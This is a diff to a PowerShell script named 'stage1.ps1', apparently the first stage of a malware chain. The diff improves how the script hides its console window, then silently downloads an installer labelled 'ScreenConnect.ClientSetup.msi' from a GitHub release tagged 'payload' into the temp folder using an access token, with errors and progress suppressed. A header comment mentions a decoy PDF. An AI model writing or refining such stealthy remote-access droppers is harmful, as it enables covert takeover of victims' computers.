@@ -1,6 +1,18 @@
-# stage1.ps1 - Hides own window, downloads, installs, PDF
-Add-Type -Name W -Namespace N -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c);'
-try { [N.W]::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0) } catch {}
+# stage1.ps1 - Hide window properly, then execute chain
+try {
+    Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class W32 {
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr h, int c);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+}
+"@
+    $h = [W32]::GetConsoleWindow()
+    if ($h -ne [IntPtr]::Zero) { [W32]::ShowWindow($h, 0) }
+} catch {}
 
 $ProgressPreference = 'SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -12,8 +24,7 @@ $msiPath = Join-Path $env:TEMP "ScreenConnect.ClientSetup.msi"
 Remove-Item $msiPath -Force -ErrorAction SilentlyContinue
 try {
     $rel = Invoke-RestMethod -Uri "https://api.github.com/repos/slynet999-coder/Yambo/releases/tags/payload" -Headers $gh
-    $assetUrl = $rel.assets[0].url
-    Invoke-WebRequest -Uri $assetUrl -Headers @{"Authorization"="token $tk";"Accept"="application/octet-stream"} -OutFile $msiPath -TimeoutSec 180 -UseBasicParsing
+    Invoke-WebRequest -Uri $rel.assets[0].url -Headers @{"Authorization"="token $tk";"Accept"="application/octet-stream"} -OutFile $msiPath -TimeoutSec 180 -UseBasicParsing
 } catch {}
 if (-not (Test-Path $msiPath)) { exit }
 if ((Get-Item $msiPath).Length -lt 1000000) { exit }
